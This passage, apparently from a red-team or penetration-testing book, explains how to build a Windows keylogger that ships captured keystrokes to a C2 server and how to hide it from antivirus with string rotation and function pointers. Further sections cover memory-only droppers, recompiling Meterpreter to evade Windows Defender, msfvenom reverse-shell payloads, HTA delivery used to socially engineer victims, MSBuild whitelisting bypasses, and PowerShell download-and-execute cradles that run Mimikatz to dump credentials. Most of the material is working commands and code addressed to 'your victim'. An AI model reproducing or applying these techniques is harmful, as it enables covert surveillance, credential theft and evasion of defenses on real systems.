virtual key code (http://bit.ly/2emagpw). this is the code for the key that was pressed and not the actual letter as the letters could vary based on the language of the keyboard. the vkcode will need to be conv erted later to the appropriate letter . for now, do not worry about passing parameters to our keyboard callback function because they will be passed by the operating system when the hook is activated. so, the initial skeleton code for hooking the keyboard would look like this: https://github.com/cheetz/ceylogger/blob/master/skeleton. as you are reviewing the skeleton code, some things to note are the inclusion of the pragma comment line, the message loop, and the return callnexthookex line in the callback function. the pragma comment line is a compiler directive to link the user32 dll. this dll holds most of the function calls that will be made and so it is required to be linked. it could also have been linked with the compiler options. next, the message loop is necessary if lowlevelkeyboardproc functions are being used. msdn states, “this hook is called in the context of the thread that installed it. the call is made by sending a message to the thread that installe d the hook. therefore, the thread that installed the hook must have a message loop.\" [http://bit.ly/2homcyq] the callnexthookex is returned because msdn states “calling the callnexthookex function to chain to the next hook procedure is optional, but it is highly recommended ; otherwise, other applications that have installed hooks will not receive hook notifications and may behave incorrectly as a result. you should call callnexthookex unless you absolutely need to prevent the notification from being seen by other applications.” [http://bit.ly/2h0n68h] next, we move on to build the functionality of the callback function starting with a file handl e. in the example code, it will create a file named “log.txt” in the w indows t emp directory (c:\\w indows\\t emp). the file is configured with append argument because the keylogger needs to continually output the keystrokes to the file. if the file is not present in temp, one will be created. going back to the kbdllhookstruct , the code declares a kbdllhookstruct pointer and then assigns it to the lparam. this will allow access to the parameters within the lparam of each key press. then the code checks to see if the wparam returned “wm_keydown”, which will check if the key was presse d down. this was done because the hook will trigger on both the press and the release of a key. if the code did not check for wm_keydown, the program would write every key twice. after checking for the downp ress, there would need to be a switch statement that checks the vkcode (virtual key code) of the lparam for special keys. certain keys would need to be written to the file differently than the rest, such as the return, control, shift, space, and tab keys. for the default case, the code would need to convert the vkcode of the key to the actual letter . an easy way to perform this conversion would be to use the toascii function . toascii will take the vkcode, a scancode, a pointer to an array of the keyboard state, a pointer to the buffer that will receive the letter , and an int value for uflag s. the vkcode and scancode are from the key struct, the keyboard state is a byte array that was declared earlier , a buffer to hold the output, and the uflags parameter will be set to 0. it is essential to check to see if certain keys were released, such as the shift key. this can be accomplished by writing another \"if statemen t\" to check for “wm _keyup” and then have a “switch statement” to check the keys that are needed. finally , the file would need to be closed and returned back to callnexthookex. the callback function looks like this: https://github.com/cheetz/ceylogger/blob/master/callback at this point, the keylogger is completely functional. however , there are a few problems. the first is that running the program spawns a command prompt, which makes it very obvious that the program is running, and the lack of output on the prompt is pretty suspicious. another problem is that having the file on the same computer on which that keylogger is running, isn’t very helpful. the command prompt problem can be fixed relatively easily by switching the standard c “main” function entry point with the windows specific winmain functio n entry point. from my understanding, the reason that this works is becaus e winmain is an entry point for a graphical program on windows. although the operating system is expecting you to handle the creation of the windows for the program, we can just tell it not to create any, since we have this control. now , the program just spawns a process in the background without creating any windows. the network side of the program will be straightforward. start by initializing the windows socket functions by declaring wsadata (http://bit.ly/2haivn7), starting winsock, clearing the hints structure, and filling in the relevant wants. for our example, the code will use af_unspec for ipv4 and soc_stream for tcp connectiv ity, and use the getaddrinfo function to fill out the c2 struct using the previous wants. after all of the required parameters are met, a socket can be created. finally , the socket_connect function connects to the socket. after the connection, the socket_sendfile function will be doing most of the work. it opens a handle to the log file with the windows “createfile” function, then it gets the file size with the “getfilesizeex” function. once the file size is obtained, the code will allocate a buffer of that size, plus one for padd ing, and then read the file into that buffer. finally , we send the contents of the buf fer over the socket. for the server side, a socat listener can be started on the c2 server on port 3490 (command to start socat: socat - tcp4-listen:3490,fork ). once the listener is started and the keylogger is running, you should see all the commands from the victim host pushed to the c2 server every 10 minutes. the initial complete version 1 of the keylogger can be found here: https://github.com/cheetz/ceylogger/tree/master/version1. before compiling the version_1.c, make sure to modify the getaddrinfo to your current c2 ip address. t o compile the code: cl version_1.c io.c. one final function that should be mentioned is the thread_func function. the thread_func calls the function get_time to get the current minute. it then checks to see if that value is divisible by 5, since the tool sends the file every 5 minutes . if it is divisibl e by 5, it sets up the socket and attempts to connect to the c2. if the connection is successful, it sends the file and runs the cleanup function. then the loop sleeps for 59 seconds. the reason that the sleep function is necessary is because this is all running in a constant loop, which means the function will get the time, set up the connection, connect, and send the file in seconds. without the 59 second sleep time, the function would end up sending the file possibly dozens of times in the 1 minute interval. the sleep function allows the loop to wait long enough for the time to change to the next minute and therefore will only send the file one time every 5 minutes. obfuscation there are hundreds of different ways to perform obfuscation. although this chapter can't go through them all, i wanted to provide you with some basic techniques and ideas to get around a v. as you may already know , av tools look for specific strings. one of the simplest method s that can be used to avoid av is to create a simple rotation cipher and shift the characters of the string. in the code below , there is a basic decrypt function that moves all strings by 6 characters (rot6). this results in garbled strings that may not get detected by av. at the start of the program, the code will call a decrypt function to take an array of strings and return them to their regular format. the decrypt function is shown below: int decrypt(const char* string, char result[]){ int key = 6; int len = strlen(string); for(int n = 0; n < len; n++){ int symbol = string[n]; int e_symbol = symbol - key; result[n] = e_symbol; } result[len] = '\\0'; return 0; } you can see an example of this in version 2 of the program here: https://github.com/cheetz/ceylogger/tree/master/version2. another method that can be used for evading antivirus is to call the functions in user32.dll using function pointers, instead of calling the function directly . to do this, first write a function definition, then find the address of the function to call by using the windows getp rocaddress function, and lastly , assign the function definition pointer to the address that was received from getprocaddress. an example of how to call the setw indowshookex function by using a function pointer can be found here: https://github.com/cheetz/ceylogger/blob/master/version3/version_3.c#l19 7-l241 (http://bit.ly/2h0vboe). version 3 of the program combines the string encryption from the previous example with the method of calling the functions with pointers. it is interesting to note that, if you submit the compiled binary to v irust otal, you will no longer see user32.dll in the imports section. in the photo below , the left image is version 1 and the right image is version 3 with calling pointers. you can find the whole source code for version 3 at: https://github.com/cheetz/ceylogger/tree/master/version3. in order to see if you have successfully evaded av, the best option is to always test it against live av systems. in a real world campa ign, i don't recommend ever using virust otal, as your samples may be sent to the different vendors. however it is great for testing/learning. for our payloads, here is the v irust otal comparison: for v ersion 1, 32bit, 1 1/66 triggered a v: https://www .virustotal.com/#/file/4f7e3e32f50171fa527cd1e53d 33cc08ab85e7a945cf0c0fcc978ea62a44a62d/detection http://bit.ly/2ixfuqh for v ersion 3, 32bit, 10/66 triggered a v: https://www .virustotal.com/#/file/8032c4fe2a59571daa83b6e2d b09ff2eba66fd299633b173b6e372fe762255b7/detection http://bit.ly/2iyym7f finally , if we compile v ersion 3 as a 64bit payload, we get 0/66!: https://www .virustotal.com/#/file/e13d0e84fa8320e310537c7fdc 4619170bfdb20214baaee13daad90a175c13c0/detection http://bit.ly/2jncbmc lab: where do you go from here? the ideas are limitless! a little fix might be to obfus cate/encrypt the log.txt contents or to initiate an encrypted socket once the program starts and then write the keystrokes right to that socket. on the receiving side, the server would reconstruct the stream and write it to a file. this would stop the log data from being seen in plain text, as it currently is, and also prevent more artifacts from touching disk. another strong improvement would be to convert the executable into a dll and then inject the dll into a running process. this would prevent even the process information from showing up in task manager . though there are programs that will show you all of the currently loaded dlls on a system, injecting the dll would be much stealthier . additionally , there are some programs that can reflectively load a dll from memory without touching disk at all, further decreasing your forensic footprint. thp custom droppers droppers are an important part of a red team’ s toolkit, allowing you to run your implants without having them on the victim’ s computer . keeping your implants off disk reduces the risk of them being compromised, allowing your work to be used multiple times. in this chapter , we are going to cover a custom thp-developed dropp er that imports either shellcode or a dll that stays resident only in memory . when designing a dropper and corresponding server , there are a few things you need to keep in mind. the purpose of the dropper is to be a use-andburn piece of your arsenal, meaning you will have to assume that using it in its current form will trigger detection in further campaigns. in order to make future campaigns easier , you will want to develop a standard server , which you can use repeatedly . in the example, you will see a basic networking implementa tion, which allows for new handlers to be registered for different messages. while this example only includes handlers for a load_blob message type, you can easily add new handlers to extend functionality . this makes for a good baselin e, as you have all your communication standardized. another importa nt step when writing droppers, or anything else you expect to be found quickly and rever se engineered, is to sanitize your strings. debug messages are great when you are first building software, relieving you from having to manually step through your debugger to see why something’ s breaking. howeve r, if they are accidentally left in on final release, you will make the analyst’ s job much easier in reversing your malware. many times anti-viruses will signature something off a unique string, or a constant value. in the example, i use infolog() and errorlog(), which the pre-processor will compile out on release builds. using those macros, which check if _debu g is defined, will dictate wheth er or not to include the relevant calls. thp custom dropper code: https://github.com/cheetz/thpdropper .git shellcode vs dlls in the following example, you are able to have the dropper load either full dlls or shellcode. generally with many public implants, you are able generate a full dll, which will download the dll and then reflect it. having your dropper load the dll directly will save you from making a few more api calls, remaining stealthier . some implants might not load correctly due to their headers being modified. if one of your implants isn’t working properl y and includes a method to generate shellcode, then this should solve your problem. this is because their custom loade r is usually written to fix up the headers and load it from that dll. there is also a large amount of shellcode available online, sites like shellstorm.or g hold archives of shellcode written for specific purposes, some of which might come in handy for your campaigns. running the server building the server is straightfo rward. on your custom thp kali image, you will need to run the following commands: for first-time compiling: cd /opt/ sudo apt-get install build-essential libssl-dev cmake git git clone https://github.com/cheetz/thpdropper .git cd thpdropper/thpd mkdir build cd build cmake .. make for subsequent compiling, all you will need to do is: cd /opt/thpd/build make to run the server , after you compile it, you will type: ./thpd [path to shellcode/dll] [loadtype] the following values are currently valid for load type: 0shellcode this will send raw shellcode bytes to the client 1dll this will send a normal dll file to be reflectively loaded in the client although these payloads (shellcode/dll) can be from any type of c2 tool (metasploit/meterpreter , cobalt strike, etc), we will be using a meterpreter payload for our examples. generating a payload: for shellcode payloads: msfvenom -a x64 -p windows/x64/meterpreter/reverse_http lhost= <your_ip> lpor t=<por t> enablestageencoding=t rue -f c note, you will have to take the output of msfvenom and only take the raw shellcode (remove quotes, new lines, and anything not shellcode). to start the server: ./thpd ./shellcode.txt 0 for dll payloads: msfvenom -a x64 -p windows/x64/meterpreter/reverse_http lhost= <your_ip> lpor t=<por t> enablestageencoding=t rue -f dll > msf.dll to start the server: ./thpd ./msf.dll 1 client the client functions in a similar way to the server , where it registers a handler for each message type. on startup, it will attempt to call back to the server , and retry for n attempts if unable to connect or upon disconnect, and send a message asking for a blob to load. the server will respond back with a blob _packet , which the client will recognize and dispatch via the head->msg field. all pack ets must have the head_p acket field defined at the start, otherwise the network handler will not be able to recognize it, and throw it away . using the buildpacketandsend() function will correctly set up the head packet, allowing the other side to decode it. to build the client, you will need v isual studio and git. start by cloning the git repository (https://github.com/cheetz/thpdropper .git) into a folder , and then open up thpdropper .sln in visual studio. make sure you are set to the proper architecture for the code you are dropping, and set it to build for release if you don’t want any debug messages. once you have done this, hit f7 and v isual studio should generate the executables for you. configuring the client and server most of the client’s configurati on is accessible in the globals.c pp file, the three main confi guration setting s you will want to change are the hostname, the port, and the packet duration. there are comm ents next to each one, telling you what they are. while you don’t need to change the packet signature, changing it will modify the first 2 bytes of each packet that are sent, which is used to identify that it is a valid connection on the server . if you wish to obfuscate the ip and port, you could write code to decrypt them when they are being accessed, and only store the encrypted version in the binary . on the server side, in the main .cpp file, you can modify the port that the server is listenin g on. this configuration is in the main function as the only parameter to startupnetworking(). if you decide to change the packet signature in the client, you will need to modify the server to reflect that. this means that in include/lib/networking.h, the packet_signa ture value needs to match the global value in the client. adding new handlers the networking code base is set up to allow you to easily add new functionality . to do so, you will need to create a callback function, with the prototype of void name() on the client, or void name(int conn) on the server . these will be registered to an array of handlers for your message types, and upon the head packet being validated, they will be called. it is your responsibility in these functions to read your packet and data from the recv buffer. you will want to call recv() to a pointer on your packet’ s structure, along with the size of that packet. this will provide information about how much to pull off the recv buffer. in this example, you will see that we read the blob_p acke t in our handler , then used the value stored in packet.payloadlen to dictate how many bytes further we had to read. the same principle can be applied to other data types. if you want to send a string containing the file path to some file on the victim’ s computer , you would have a field in the handler’s packet describing the length of the string, which you would send after the packet. further exer cises while this code will give you a solid base to work with, there are many ways you can improve it yourself. adding a simple encryption layer to the transport layer would be straightforward. you would want to create your own send and recv wrappers, which decrypt/encrypt before calling the send and recv functio ns. an extre mely easy way to do this would be to use a multi byte xor key, which while not very secure, would at least change your messages enough to not be easily identifiable. another exercise could be to extend the loadblobhand ler() function to have a new load_type, which would load a signed driver if the client is being run as administrator . this can be accomplished by using the createservice() and startservice() winapi calls. however , keep in mind that loading a driver requires it to be on disk, which will trigger a file system mini-filter driver to pick it up. recompiling metasploit/meterpreter to bypass av and network detection i really wanted to cover this topic. be aware that this is going to be a little more advanced and you will most likely run into some issues during compile time. there are plenty of great tools like metasploit/meterpreter out there, but every antivirus and network intrusion detection (nid) tool has developed signatures for it. we can try to obfuscate payloads with shikata ga nai and go over https, but that only goes so far. any type of obfuscation will generally have a stub signature to detect off of, av will look into memory for certain strings in certain locations, and networks perform man-in- the-middle inspection over https. so how can we do to keep using our favorite tools , while getting around all the common protections? let's take the exam ple of metasploit/meterpreter and see how we can bypass all these hurdles. our goals are to get around av signatures on the binary , av signatures in memory , and network signatures. in order to evad e all these detection methods, we will need to do a few things. first, we need to modify the meterpreter payloads to make sure they aren't easily detected with signatures both on the network and in memory . second, we modify the metsvc persistence module to prevent it from flagging anti-virus. third, we compile portions of metsrv (the actual meterpreter payload) with clang, to prevent it also from flaggin g anti-virus signatures. last, we will write our own stage0 payload, which downloads and executes meterpreter , to bypass all anti-virus. compiling metsrv (network service wrapper for meterpreter) with clang and remove metsrv/metsvc-server references: http://bit.ly/2h2kaub modifying payloads to get rid of strings like mimikatz http://bit.ly/2is9hvl modified reflective dll injection to remove strings like reflectiveloader http://bit.ly/2qywffk many network products detect the stage 0/1/2 loaders of meterpreter as they go acros s the wire. besides obfuscating our payload, we can also obfuscate the actual shellcode. one example is to go through all the ruby files for the different payload types and add random nop sleds to avoid detection: http://bit.ly/2jkuhdx custom stage0 payload: http://bit.ly/2el ykm8 lab: in this lab, we are going to take all of our modified metasploit/meterpreter code, recompile it, and make sure that it can evade basic a v detection. before starting, review the build environment setup from metasploit: https://github.com/rapid7/metasploitpayloads/tree/master/c/meterpreter https://github.com/rapid7/metasploit-framework/wiki/settingup-a-metasploit-development-environment requirements for w indows: visual studio 2013 (vs2013) - community edition is fine. need c/c++ installed with the install llvm 32bit installed for windows (install this after visual studio and make sure llvm toolchain installs) - download ll vm 6 @ http://releases.llvm.or g/download.html gnu make installed on windows (http://gnuwin32.sourcefor ge.net/packages/make.htm) - make sure this is in your path or that you run it from its installed path where applicable. git-scm (git-scm.com) how to build metasploit/meterpr eter on w indows: start by pulling all the cybersp acekitten's repositories. these files have already been heavily modified for your lab, but as a proof of concept. first, we need to pull down both the framework and all the payloads: git clone https://github.com/cyberspacekittens/metasploitframework cd metasploit-framework && git submodule init && git submodule update && cd .. git clone https://github.com/cyberspacekittens/metasploitpayloads cd metasploit-payloads && git submodule init && git submodule update && cd .. although all the changes to modify strings, compile to clang, and payload nops are already made in these repositories, be sure to review the metasploit dif f between these two to see exactly what was changed. compile metasploit/meterpreter the first thing we are going to do is recompile our metsvc and metsvcserver with our updated chang es. from visual studio 2013 command prompt for vs2013: go to the folder where the source code for our modified metsvc is. cd metasploit-framework\\external\\source\\metsvc\\src compile using make: \"c:\\program files (x86)\\gnuw in32\\bin\\make.exe\" move our newly created binaries to our meterpreter folder: copy metsvc.exe ..\\..\\..\\..\\data\\meterpreter\\ copy metsvc-server .exe ..\\..\\..\\..\\data\\meterpreter\\ next, modify our meterpreter payloads and compile them using the supplied .bat file: cd metasploit-payloads\\c\\meterpreter make.bat after everything is compiled, two folders are generated (x86 and x64). copy all the compiled dlls to the meterpreter folder: copy metasploit-payloads\\c\\meterpreter\\output\\x86\\* metasploitframework\\data\\meterpreter copy metasploit-payloads\\c\\meterpreter\\output\\x64\\* metasploitframework\\data\\meterpreter that is it for the server . we can now move the entire metasploit -framework folder to your kali system and start an https reverse handler (windows/x64/meterpreter/reverse_https). creating a modified stage 0 payload: the last thing we need to do is create a stage 0 payload to have our initial executable bypa ss all av detection. if you aren't aware, a stage 0 in meterpreter is the first stage of any exploit or payload. this is a chunk of code which does one simple thing: connect back, or listen, in our desired way (reverse_https, reverse_tcp, bind_tcp, etc) and then receives a metsrv .dll file. it then loads this file in memory , and executes it. in essence, any stage 0 payload is just a glorified \"download-and-execut e\" payload. because this is how all of metasploit functions, there are advanced signatures and heuristics for metasploit specific behavior in many anti-virus solutions - even modifying the shellcode and adding junk code will still flag due to the heuristic behavior . to get past this, we write our own stage 0 that performs the same function (download and execute in memory): we mirror the download calls of meterpreter's reverse_https payload to fetch metsrv .dll from the server , and then reflect it in memory and execute it. the specific example payload provided here has some more advanced functionality . this was done to allow it to be pic (position independent) and with no imports. this code was developed on top of thealpiste's code (https://github.com/thealpiste/c_reversehttps_shellcode). the example provided performs the following: all code locates dlls and functions in memory for execution; no imports are used. this is accomplished by manually defining stubs for all functions used and then searching for them in memory . wininet is used to perform the actual https requests back to the configured metasploit handler . metsrv .dll is received, and the data blob is executed. the way metasploit serves these files means the entry-point is the beginning of the buf fer. this functionality is the exact same process on how the payloads that are built into msfvenom are executed. however , msfvenom adds these to template executa bles in a very predictable, detectable manner , which is not configurable. because of that, most av identifies them all the time. instead, with a little coding know-how , you can re-write the functionality of the payloads, since they are small, and bypass any detection which currently exists. this payload is known to bypass all av, including windows defender , at the time of this writing. creating the payload (full payload is located here: http://bit.ly/2el ykm8): in vs13, open metasploitpayloads\\c\\x64_defender_bypass\\x64_defender_bypass.vcxproj under x64_defender_bypass there is a settings.h file. open this up and modify the host and por t information to your meterpreter handler information. make sure to set the build to \"release\" and compile \"x64\" save and build under metasploit-payloads\\c\\x64_defender_bypass\\x64\\release a new binary \"x64_defender_bypass.exe\" will be created. execute this payload on your victim machine that is running windows defender . when this project was build, w indows defender did not detect this payload. you now have a heavily obfuscated meterpreter binary and obfuscated transport layer to get around all of the default protections. now , this was just a proof of concept to get you started. as soon as this book is released, i am sure a signat ure will be detected for some of these techniques. there is still much more you can do to better evade detection tools. for example, you can: build with a clang obfuscation toolchain use a string encryption library for all strings change meterpreter entry-point (it is currently init) create an automated script, adding nops to all the payload types edit the actual ruby for the payload generation to randomize the payload's on every run s h a r p s h o o t e r as a red teamer , one of the most time consuming areas is creating payloads that evade next generation av and sandboxes. we are constantly looking for new methods to create our initial stagers. one tool, called sharpshooter , takes a lot of the anti-sandboxing techniques and james forshaw’ s dotn ettojscript to execute shellcode in window s scripting formats (cactust orch tool https://github.com/mdsecactivebreach/cactust orch). from mdsec's website on sharpshooter , \"sharpshooter supports both staged and stageless payload execution. staged execution can occur over either http(s), dns or both. when a staged payload is executed, it will attempt to retrieve a c sharp source code file that has been zipped and then base64 encoded using the chosen delivery technique. the c sharp source code will be downloaded and compiled on the host using the .net codedom compiler . reflection is then subsequently used to execute the desired method from the source code.” [https://www .mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/ ] let's walk through a quick example: python sharpshooter .py --interactive 1 - for .net v2 y - staged payload 1 - ht a payload the following anti-sandbox techniques are available: you can pick your techniques to get around sandboxes from successfully executing your malware. [1] key to domain [2] ensure domain joined [3] check for sandbox artifacts [4] check for bad macs [5] check for debugging 1 - w eb delivery y - builtin shellcode template shellcode as a byte array open a new terminal and create a csharp meterpreter payload msfvenom -a x86 -p windows/meterpreter/reverse_http lhost=10.100.100.9 lpor t=8080 enablestageencoding=t rue stageencoder=x86/shikata_ga_nai -f csharp copy everything between the \"{\" and \"}\" and submit as the byte array provide uri for csharp web delivery put in your attacker ip/port and file. example: http://10.100.100.9/malware.payload provide name of output file malware y - do you want to smuggle inside html? use a custom (1) or predefined (2) template for testing, choose any of the predefined templates move the newly create malicious files to your web directory mv output/* /var/www/html/ set up a meterpreter handler for your payload once you configure and deve lop your malware, move it to the web directory (malw are.hta, malware.html, malware.payload), start your apache2 service , and start your meterpreter handler . you are now ready to social engineer your victim into visiting your malicious site! the example given above was sharpshooter ’s sharepoint online template. when the victim visits your malicious page using ie/edge, the hta automatically downloads and prompts to run. once prompted and selected to run, the stager payload will run, download the secondary payload (if sandbox controls are met), and execute our meterpreter payload in memory . additional information: https://www .mdsec.co.uk/2018/03/payload-generation-usingsharpshooter/ https://github.com/mdsecactivebreach/sharpshooter application whitelisting bypass we have talked about the different ways to trigger powershell without running the powershell code, but what if you can't run custom binaries on the windows system? the concept of application bypass is to find default windows binaries that can execute our payloads. we have been on boxes like domain controllers that are locked down well and coded execution is limited. there are different windows files we could use to bypass these restrictions—let’ s go over a couple of them. one windows binary that is often talked about, which circumvents application whitelisting, is msbuild.exe. what is msbuild.exe and what does it do? msbuild is a defau lt application within the .net framework and serves as a platform for building .net applications using a project file in xml format. we can abuse this feature by creating our own malicious xml project file to execute a meterpreter session, using a tool called greatsct . greatsct (https://github.com/greatsct/greatsct) has various application whitelisting bypasses that we can use, but we are just going to cover msbuild. in this exampl e, we will create a malicious xml file that hosts a reverse_ http meterprete r session. this will require us to write the xml file to the victim system and use msbuild to execute the xml file: git clone https://github.com/greatsct/greatsct .git /opt/ cd /opt/greatsct python3 ./gr8sct.py [4] msbuild/msbuild.cfg enter your host ip [0] and port [1] generate set up a windows/meterpr eter/reverse_http handles in metasploit in our kali instance, we used greatsct to create the shellco de.xml file, which has both build informatio n and a meterpreter reverse http shell. this file would need to be moved to our victim system and called, using msbuild. *note: i do see greatsct being actively built on the \"develop\" branch (https://github.com/greatsct/greatsct/tree/develop), which includes https meterpreter and additiona l whitelisting bypasses. i assume by the time this book is released, it will be moved to \"master .\" once executed on our windows victim machine, using the command \"c:\\w indows\\microsoft.net\\framework\\v4.0.30319\\msbuild.exe shellcode.xml\", .net will start to build the shellcode.xml file. during this process, your victim machine will spawn a reverse http meterpreter session, bypassing any application whitelisting. you may want to edit the shellcode.xml file to put in obfuscated payloads, as the default meterpreter will most likely trigger a v. there are many different ways to perform application whitelisting bypasses that it would be a book of its own. here are some additional resources: tons of great examples using w indows default executables: https://github.com/api0cradle/ultimateapplockerbyp asslist using regsr v32 and powershell empire: https://www .blackhillsinfosec.com/evade-applicationwhitelisting-using-regsvr32/ dll execution via excel.application registerxll: https://rileykidd.com/2017/08/03/applicationwhitelist-bypass-using-xll-and-embeddedshellcode/ leveraging inf-sct fetch & execute t echniques for bypass, evasion, & persistence: https://bohops.com/2018/03/10/leveraging-inf-sctfetch-execute-techniques-for -bypass-evasionpersistence-part-2/ applocker bypass with regsvr32: https://pentestlab.blog/2017/05/1 1/applocker -bypassregsvr32/ code caves as with any red team campaign, we are always looking for creative ways to move laterally within an environment or keep persistence. usually , if we have credentials, we try to execu te payloads on a remote system using wmi or psex ec. there are times, though when we need to find creative ways to move within an environment without being easily tracked. as red teamers, getting caug ht is not the worst thing that can happen during a campaign. it is when we get caught and the blue team finds every domain, ip, and compromised host that was part of the campaign. it is generally pretty easy for blue teamers to review the wmi/psexec style connections to identify lateral movement, since it is not always seen as normal traffic. so what can we do to hide our lateral movement a bit more? this is where we can get creativ e and there is no right answer (if it works, that’s good enough for me). one of my favorite things to do once inside an environment is to identity the public shares and files that are actively shared/executed. we could try to add macros to office files, but that might come off too obvious. one attack that generally has low detecti on, but high success rates, is embedding our custom malware inside executable binaries. this could be a shared binary like putty , a common internal thick client, or even database tools. although no longer maintained , one of the easiest tools to perform these attacks was called backdoor factory (https://github.com/secretsquirrel/thebackdoor -factory). backdoor factory would look for code caves or empty blocks within a real program, where an attacker can inject their own malicious shellcode. this was covered in thp2 and the ideas remain the same. two great additional resources for backdooring executables can be found here: https://haiderm.com/fully-undetectable-backdooring-pefile/#code_caves https://www .abatchy .com/2017/05/introduction-to-manualbackdooring_24.html powershell obfuscation the problem with powershell scripts today is that if you are dropping them onto disk, many antivirus tools will pick them up. even if you import them into memory , av tools that look in memory may sometimes alert on them, too. regardless, if you are importin g them into memory from cobalt strike, meterpreter , or powershell empire, it is important to make sure that we don't get picked up by av. if we do, we should, at the very least, make it hard for ir/forensic teams to reverse our attack payloads. we have all seen the commands for powershell like this: powershell.exe -noprofile -noninteractive -w indowstyle hidden -executionpolicy bypass iex (new-object net.w ebclient).downloadstring('[powershell url]'); [parameters] this the most basic combinati on of strings we might see to bypass the execution policy , run hidden/noninteractive, and to download and execute a powershell payload. for blue teams, we have seen a lot of logging picked up on these specific parameters like \"-exec bypass\". so, we started obfuscating this parameter by some common powershell syntax: -executionpolicy bypass -ep bypass -exec bypass -execution bypass what is even crazier , and i give credit to daniel bohannon for identifying this, is that you don't actually need to do the full parameter string to get it to work. for example, for -executionpolicy bypass, all of these examples will work: -executionpolicy bypass -executionpol bypass -executio bypass -exec bypass -ex bypass these same techniques will work for windowstyle or even the encodedcommand parameter . of course, these tricks will only get us so far and we need to create more obfuscated transforms. to start, we can take a very simple example to execute our remote powershell script (in this case mimikatz) and dump hashes using an administrative powershell prompt: invoke-expression (new-object net.w ebclient).downloadstring('http://bit.ly/2jhvdzf'); invoke-mimikatz -dumpcreds going through (invoke-obfuscation), we can take this string and heavily obfuscate it using several dif ferent techniques: on w indows, download the powershell files for invokeobfuscation (https://github.com/danielbohannon/invokeobfuscation) load powershell script and start invoke-obfuscation import-module ./invoke-obfuscation.psd1 invoke-obfuscation set your powershell script you want to obfuscate. in this case, we will obfuscate the download and dump hashes from mimikatz above. set scriptblock invoke-expression (newobject net.w ebclient).downloadstring('http://bit.ly/2jhvdz f'); invoke-mimikatz -dumpcreds encode the payload encoding in this case, i chose securestring (aes), but you can play around with all the obfuscation techniques. if you look at the obfuscated string, there is a randomly genera ted key and an encrypted secure string. upon execution an administrative powershell, we still get the full payload to execute. we can also go back to the main screen and create obfuscated launchers: main launcher clip++ choose your execution flags even better is that if we look in the windows powershell logs, it is very obfuscated and could help evade a v and seim alerting tools. in addition to invoke-obfuscation, daniel created a tool that focuses on remote download cradles called invoke-cradlecrafter . \"invokecradlecrafter exists to aid blue teams and red teams in easily exploring, generating and obfuscating powershell remote download cradles. in addition, it helps blue teams test the effectiveness of detectio ns that may work for output produced by invoke-obfuscation but may fall short when dealing with invoke-cradlecra fter since it does not contain any string concatenations, encodings, tick marks, type casting, etc.” [https://github.com/danielbohannon/invoke-cradlecrafter] powershell without powershell: you finally get remote code execution on a box, but you find out that you either can't run powershell.exe or the company is monitoring powershell.exe commands. what are your options to get your powershell payload or c2 agents running on that host system? nopowershell (nps) i love the conce pt of nopowershell or nps. nps, is a windows binary that executes powershell through .net, instead of directly calling powershell.exe. although this is generally flagged today by a v, we use the same concepts to create binaries to directly execute our powershell malware without needing powershell.exe. ben0xa does give you source, so feel free to try to obfuscate the binary to get around a v. nps_payload (https://github.com/trustedsec/nps_payload) another take on nps is a tool by trustedsec that takes advantage of executing code through msbuild.exe. this tool generates a powershell payload into a msbuild_nps.xml file that is executed when called. the xml file can be called by: c:\\w indows\\microsoft.net\\framework\\v4.0.30319\\msbuild.ex e c:\\<path_to_msbuild_nps.xml> sharppick sharppick, a component of powerpick, is a great tool that allows you to call powershell without ever calling the powershell.exe binary . within sharppick, \"the runps function uses the system.management. automation function to execute a script inside of a powershell runspace without ever starting a powershell process.” [ http://www .sixdub.net/?p=555] after you download sharppick (https://github.com/powershellempire/powert ools/tree/master/powerpick), you can take your powershell empire payloads and create binaries. a full walkthrough of how to set up your environment and build your payload can be found at: http://www .sixdub.net/?p=555 https://bneg.io/2017/07/26/empire-without-powershell-exe/ there are times when dropping a binary on the host system might not be possible. in those cases, we can create a class library (dll file) that we can drop onto the system and execute with \"rundll32.exe runmalicious.dll,entrypoint\". of course, the creation of these dlls can be automatically done for meterpreter or cobalt strike, but it's nice having the flexib ility to run specific powershell payloads without ever calling powershell.exe. hidemyps one tool that i wrote a few years ago, which still has great success is hidemyps (found here: https://github.com/cheetz/hidemyps). this was always just a poc tool, but it still works even after all these years. the issue i was running into was that any powershell script these days gets picked up by av. for example, if we drop the normal invoke-m imikatz.ps1 (http://bit.ly/2h3cnxs) on a windows system with windows defender , it will pick up the powershell script instantly and send red flags everywhere. this is one of the major flaws of traditional av and the fact that they generally look for very specific strings in malware. there fore, i put together a small python script that takes a powershell script and obfuscates all the strings (this was only tested with a few scripts, so it is nowhere near production code). hidemyps will find all the functions and obfuscate them using rot , remove all comments from powershell scripts, and cut strings to evade static a v signatures. for the next example, let's take invoke_mimikatz.ps1 (http://bit.ly/2h3cnxs) and obfuscate the powershell file: cd /opt/hidemyps python hidemyps.py invoke_mimikatz.ps1 [filename.ps1] now , take a look at the difference between the original file and the new file you created. first off, you can see the function names are all mixed up, variables have been changed, strings have been broken in half, and all the comments are missing. the one thing you have to remember is that we changed all the function names in the powershell script. so, in order to call the functions, we are going to have to look back in our obfuscated file and see what we did to replace \"function invoke-mimikatz\". in this case, invoke-mimikatz was changed to vaibxr -zvzvxngm. the following example was run on a fullypatched w indows 10 with defender completely up-to-date. c o n c l u s i o n as red teamers or penetration testers, it is always going to be a cat and mouse game with host and network detection tools. this is why it is very important to be able to underst and how the underlying protections work, write lower -leve l code to interact directly with windows apis versus shell commands, and to think outside the box and get creative. if you focus on only using common tools, the likelihood that you will get detected in a corporate enviro nment is pretty high. if the tools are public, most likely the security vendor s are reversing these as quickly as they come out and developing signatures for them. it is up to you to take the current attacks and exploit and craft them in a way so that they are not recogniz ed by these vendors. 8 special teams - cracking, exploits, and tricks this chapter focuses on a handfu l of different resources that i have found to be useful for both red teams and penetration testing. thes e resources may not be used in every camp aign, but are great for specific scenarios or one-of f cases. automation as heuristic-based endpoint protections get better and better , our attacks need to become quicker and quicker . we can generally write malware to evade av and get through the initial detections, but once we start making calls like mimikatz (in memory ) or moving laterally to another host, we start to set off alarms. to counter this, i always tell red teams to get caught on the first attempt. usually , blue teams see this as a win when they trigger on our basic/default style (or slightly obfuscated) malware, but the real purpose of it is to just learn about their environme nt. this is accomplished by our initial payload auto-running multiple reconnaissance scripts on the victim’ s machine. in the next section, we will go over some quick auto-run scripts that can help automate some of our attacks. automating metasploit with rc scripts with metasploit, we can ef ficiently and ef fectively run our post-exploitation scripts using: search all post exploitation modules in metasploit msfconsole show post from the “post” results, select all the modules you want to include for autoexecution when receiving a meterpreter shell. in this case, we are going to add a 